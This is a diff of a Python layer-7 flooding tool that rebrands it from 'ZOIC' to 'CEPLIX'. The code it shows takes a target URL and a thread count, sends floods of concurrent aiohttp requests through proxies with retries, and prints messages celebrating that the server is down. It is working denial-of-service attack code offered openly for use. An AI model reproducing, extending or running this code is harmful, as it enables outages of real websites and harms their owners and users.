@@ -132,9 +132,9 @@ def layer7():
 
                 await asyncio.gather(*tasks)
 
-            url = input(f"[{zoic}ZOIC{clear}] URL     {zoic}>{clear} ")
-            threads = int(input(f"[{zoic}ZOIC{clear}] THREAD     {zoic}>{clear} "))
-            print(f"[{zoic}ZOIC{clear}] {url}")
+            url = input(f"[{ceplix}CEPLIX{clear}] URL     {ceplix}>{clear} ")
+            threads = int(input(f"[{ceplix}CEPLIX{clear}] THREAD     {ceplix}>{clear} "))
+            print(f"[{ceplix}CEPLIX{clear}] {url}")
             asyncio.run(start_threads(url, threads))
 
 
@@ -147,19 +147,19 @@ def layer7():
                 
                 try:
                     async with session.get(url, headers=headers) as response:
-                        print(f"[{zoic}ZOIC{clear}] Url {zoic}:{clear} {zoic}{proxy}{clear} {zoic}>{clear} {url} {zoic}|{clear} Status {zoic}:{clear} {red}{response.status}{clear}")
+                        print(f"[{ceplix}CEPLIX{clear}] Url {ceplix}:{clear} {ceplix}{proxy}{clear} {ceplix}>{clear} {url} {ceplix}|{clear} Status {ceplix}:{clear} {red}{response.status}{clear}")
                 except aiohttp.ClientConnectorError:
-                    print(f"[{red}-{clear}] {red}Server has down by ZOIC !!{clear}")
+                    print(f"[{red}-{clear}] {red}Server has down by CEPLIX !!{clear}")
                     if retries > 0:
                         await asyncio.sleep(2)
                         await send_request(session, url, proxy, retries - 1)
                 except aiohttp.ServerDisconnectedError:
-                    print(f"[{red}-{clear}] {red}Server has disconnected by ZOIC !!{clear}")
+                    print(f"[{red}-{clear}] {red}Server has disconnected by CEPLIX !!{clear}")
                     if retries > 0:
                         await asyncio.sleep(2)
                         await send_request(session, url, proxy, retries - 1)
                 except asyncio.TimeoutError:
-                    print(f"[{red}-{clear}] {red}Server has TIMEOUT by ZOIC !!{clear}")
+                    print(f"[{red}-{clear}] {red}Server has TIMEOUT by CEPLIX !!{clear}")
                     if retries > 0:
                         await asyncio.sleep(2)
                         await send_request(session, url, proxy, retries - 1)
@@ -180,9 +180,9 @@ def layer7():
 
                 await asyncio.gather(*tasks)
 
-            url = input(f"[{zoic}ZOIC{clear}] URL     {zoic}>{clear} ")
-            threads = int(input(f"[{zoic}ZOIC{clear}] THREAD     {zoic}>{clear} "))
-            print(f"[{zoic}ZOIC{clear}] {url}")
+            url = input(f"[{ceplix}CEPLIX{clear}] URL     {ceplix}>{clear} ")
+            threads = int(input(f"[{ceplix}CEPLIX{clear}] THREAD     {ceplix}>{clear} "))
+            print(f"[{ceplix}CEPLIX{clear}] {url}")
             asyncio.run(start_threads(url, all_proxies, threads)) 
 
 
